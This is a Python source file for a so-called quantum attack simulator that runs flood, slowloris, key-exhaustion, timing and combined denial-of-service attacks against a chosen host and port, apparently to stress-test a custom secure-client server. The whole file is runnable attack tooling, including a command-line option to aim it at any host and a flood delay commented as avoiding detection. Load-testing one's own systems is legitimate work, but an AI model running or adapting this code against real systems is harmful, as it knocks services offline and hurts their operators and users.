import time
import random
import numpy as np
from network.secure_client import SecureClient
import os
import socket
from threading import Thread

class QuantumAttackSimulator:
    def __init__(self, target_host='localhost', target_port=65432):
        self.target_host = target_host
        self.target_port = target_port
        self.attack_log = "attack_simulation.log"
        self.attack_types = {
            'flood': self._flood_attack,
            'slowloris': self._slowloris_attack,
            'key_exhaustion': self._key_exhaustion_attack,
            'timing': self._timing_attack,
            'hybrid': self._hybrid_attack
        }
        
    def log_attack(self, attack_type, duration, packets_sent):
        with open(self.attack_log, 'a') as f:
            f.write(f"{time.ctime()}: {attack_type} attack for {duration:.1f}s, {packets_sent} packets\n")

    def _flood_attack(self, duration=30):
        """High-volume packet flood attack"""
        start = time.time()
        packets = 0
        try:
            client = SecureClient(self.target_host, self.target_port)
            client.start_session()  # Establish legitimate connection first
            
            while time.time() - start < duration:
                # Send random garbage data
                garbage = os.urandom(random.randint(64, 1024))
                client.s.sendall(garbage)
                packets += 1
                time.sleep(0.01)  # Small delay to avoid immediate detection
                
        except Exception as e:
            print(f"Flood attack error: {e}")
        finally:
            self.log_attack('FLOOD', time.time()-start, packets)

    def _slowloris_attack(self, duration=120):
        """Slow request attack keeping connections open"""
        start = time.time()
        connections = []
        
        try:
            # Create multiple partial connections
            for _ in range(50):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target_host, self.target_port))
                connections.append(s)
                # Send partial HTTP headers if needed
                s.send(b"GET / HTTP/1.1\r\nHost: " + self.target_host.encode() + b"\r\n")
                time.sleep(0.1)
                
            # Keep connections alive
            while time.time() - start < duration:
                for s in connections:
                    try:
                        s.send(b"X-a: b\r\n")
                        time.sleep(10)
                    except:
                        connections.remove(s)
                        s.close()
                        
        finally:
            for s in connections:
                s.close()
            self.log_attack('SLOWLORIS', time.time()-start, len(connections))

    def _key_exhaustion_attack(self, duration=60):
        """Force server to generate excessive quantum keys"""
        start = time.time()
        attempts = 0
        
        try:
            while time.time() - start < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.target_host, self.target_port))
                    # Receive key then immediately disconnect
                    s.recv(1024)
                    s.close()
                    attempts += 1
                    time.sleep(0.5)
                except:
                    continue
                    
        finally:
            self.log_attack('KEY_EXHAUSTION', time.time()-start, attempts)

    def _timing_attack(self, duration=90):
        """Precision timing attack on quantum channel"""
        start = time.time()
        packets = 0
        
        try:
            client = SecureClient(self.target_host, self.target_port)
            client.start_session()
            
            # Send packets with precise timing variations
            while time.time() - start < duration:
                delay = random.choice([0.001, 0.005, 0.01, 0.1, 0.5])
                time.sleep(delay)
                client.s.sendall(b"TIMING_ATTACK")
                packets += 1
                
        except Exception as e:
            print(f"Timing attack error: {e}")
        finally:
            self.log_attack('TIMING', time.time()-start, packets)

    def _hybrid_attack(self, duration=180):
        """Combination of multiple attack vectors"""
        start = time.time()
        
        # Run different attacks in threads
        threads = [
            Thread(target=self._flood_attack, args=(duration,)),
            Thread(target=self._slowloris_attack, args=(duration,)),
            Thread(target=self._timing_attack, args=(duration,))
        ]
        
        for t in threads:
            t.start()
            
        for t in threads:
            t.join()
            
        self.log_attack('HYBRID', time.time()-start, 0)

    def run_attack(self, attack_type='hybrid', duration=60):
        """Execute specified attack type"""
        if attack_type.lower() == 'all':
            for name, attack in self.attack_types.items():
                print(f"\nStarting {name} attack...")
                Thread(target=attack, args=(duration,)).start()
                time.sleep(5)
        elif attack_type in self.attack_types:
            print(f"\nStarting {attack_type} attack...")
            self.attack_types[attack_type](duration)
        else:
            print(f"Unknown attack type. Available: {list(self.attack_types.keys()) + ['all']}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Quantum Security Attack Simulator")
    parser.add_argument('--host', default='localhost', help="Target host")
    parser.add_argument('--port', type=int, default=65432, help="Target port")
    parser.add_argument('--attack', default='hybrid', 
                       help="Attack type (flood, slowloris, key_exhaustion, timing, hybrid, all)")
    parser.add_argument('--duration', type=int, default=60, help="Attack duration in seconds")
    
    args = parser.parse_args()
    
    simulator = QuantumAttackSimulator(args.host, args.port)
    simulator.run_attack(args.attack.lower(), args.duration)
